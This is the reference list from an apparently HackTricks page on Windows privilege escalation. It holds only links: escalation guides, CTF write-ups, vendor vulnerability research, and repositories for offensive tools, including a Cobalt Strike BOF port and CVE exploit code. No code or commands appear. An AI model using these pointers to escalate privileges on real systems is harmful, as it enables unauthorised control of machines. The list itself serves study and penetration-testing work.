- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
